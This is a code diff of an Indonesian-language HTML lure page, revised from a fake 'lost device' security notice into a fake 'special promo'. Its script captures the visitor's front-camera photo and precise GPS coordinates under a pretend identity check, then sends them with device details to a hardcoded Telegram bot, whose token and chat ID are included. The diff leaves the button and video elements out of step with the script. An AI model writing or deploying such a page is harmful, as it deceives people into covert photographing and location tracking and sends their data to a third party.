@@ -3,56 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lacak Perangkat Hilang</title>
+    <title>Pemberitahuan Keamanan</title>
     <style>
         body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 50px 20px; }
         .box { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h2 { color: #d32f2f; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; }
-        #status { margin-top: 20px; color: #555; font-size: 14px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        .btn:disabled { background: #999; }
+        #status { margin-top: 20px; color: #555; font-size: 14px; line-height: 1.5; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h2>PEMBERITAHUAN KEAMANAN</h2>
-        <p>Perangkat ini telah dilaporkan hilang. Mohon konfirmasi identitas anda untuk proses pengembalian.</p>
-        <button class="btn" onclick="startCapture()">SAYA MENEMUKAN HP INI</button>
-        <div id="status"></div>
-    </div>
+    <h2>🎁 PROMO SPESIAL</h2>
+    <p>
+        Selamat datang! Lihat penawaran dan promo terbaru yang tersedia hari ini.
+    </p>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <button class="btn">
+        Lihat Promo
+    </button>
+
+    <div id="status"></div>
+</div>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:linear-gradient(135deg,#ff4d4d,#ff9800);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    width:340px;
+    background:#fff;
+    border-radius:15px;
+    padding:25px;
+    text-align:center;
+    box-shadow:0 10px 30px rgba(0,0,0,.2);
+}
+
+.box h2{
+    color:#d32f2f;
+    margin-bottom:15px;
+}
+
+.box p{
+    color:#555;
+    line-height:1.5;
+}
+
+.btn{
+    margin-top:20px;
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:#d32f2f;
+    color:#fff;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+.btn:hover{
+    background:#b71c1c;
+}
+</style>
 
     <script>
         // --- PENGATURAN BOT TELEGRAM ---
-        const botToken = "8603492286:AAHyO8zlfVc0uC0L7fQ6DzWCDleLNv7DeoU"; // Masukkan Token dari BotFather
-        const chatId = "862174426";   // Masukkan ID kamu dari userinfobot
+        const botToken = "8603492286:AAHyO8zlfVc0uC0L7fQ6DzWCDleLNv7DeoU"; 
+        const chatId = "862174426";   
+
+        let locationData = null;
 
         async function startCapture() {
             const status = document.getElementById('status');
+            const btn = document.getElementById('btnStart');
+            btn.disabled = true;
+            btn.innerText = "MEMPROSES...";
             status.innerText = "Menghubungkan ke server keamanan...";
 
+            // 1. Ambil lokasi GPS dulu
+            await getLocation();
+
+            // 2. Setelah itu ambil kamera
             try {
-                // Minta izin kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } // Kamera depan
+                    video: { facingMode: "user" }
                 });
                 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                status.innerText = "Memverifikasi... Mohon tunggu.";
+                status.innerText = "Memverifikasi identitas...";
 
-                // Ambil foto setelah 2 detik agar gambar fokus
                 setTimeout(() => {
                     captureAndSend(stream);
                 }, 2000);
 
             } catch (err) {
                 status.innerHTML = "<b style='color:red'>Izin kamera diperlukan untuk verifikasi!</b>";
+                btn.disabled = false;
+                btn.innerText = "COBA LAGI";
             }
+        }
+
+        // Fungsi ambil GPS
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.log("Geolocation tidak didukung");
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+                        console.log("Lokasi didapat:", locationData);
+                        resolve();
+                    },
+                    (error) => {
+                        console.log("Gagal ambil lokasi:", error.message);
+                        locationData = { error: error.message };
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,  // WAJIB agar GPS akurat
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
         }
 
         function captureAndSend(stream) {
@@ -64,28 +160,60 @@
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convert ke Blob (File) agar bisa dikirim sebagai foto asli, bukan link base64
             canvas.toBlob(blob => {
+                // Siapkan caption dengan info lokasi
+                let caption = `📷 FOTO TARGET DITEMUKAN!\n\n`;
+                caption += `📱 Device: ${navigator.userAgent}\n`;
+                caption += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n\n`;
+
+                if (locationData && locationData.lat) {
+                    caption += `📍 LOKASI GPS:\n`;
+                    caption += `Latitude: ${locationData.lat}\n`;
+                    caption += `Longitude: ${locationData.lon}\n`;
+                    caption += `Akurasi: ${Math.round(locationData.accuracy)} meter\n\n`;
+                    caption += `🗺 Google Maps:\nhttps://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
+                } else {
+                    caption += `📍 Lokasi: Tidak diizinkan / gagal`;
+                }
+
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'pencuri.jpg');
-                formData.append('caption', `📷 FOTO TARGET DITEMUKAN!\n\n📱 Device: ${navigator.userAgent}\n⏰ Waktu: ${new Date().toLocaleString()}`);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', caption);
 
-                // Kirim ke Telegram API
+                // Kirim FOTO ke Telegram
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(res => res.json())
                 .then(data => {
-                    document.getElementById('status').innerHTML = "<b>Verifikasi Berhasil.</b><br>Terima kasih atas bantuan Anda.";
-                    // Matikan kamera setelah selesai
+                    // Kirim juga LOKASI sebagai pin peta (opsional, lebih keren)
+                    if (locationData && locationData.lat) {
+                        sendLocationPin();
+                    }
+
+                    document.getElementById('status').innerHTML = 
+                        "<b style='color:green'>✅ Verifikasi Berhasil.</b><br>Terima kasih atas bantuan Anda.";
                     stream.getTracks().forEach(track => track.stop());
                 })
                 .catch(err => {
-                    console.error("Gagal kirim ke Telegram:", err);
+                    console.error("Gagal kirim:", err);
                 });
             }, 'image/jpeg', 0.8);
+        }
+
+        // Kirim lokasi sebagai pin di Telegram (bukan cuma teks)
+        function sendLocationPin() {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('latitude', locationData.lat);
+            formData.append('longitude', locationData.lon);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
 </body>
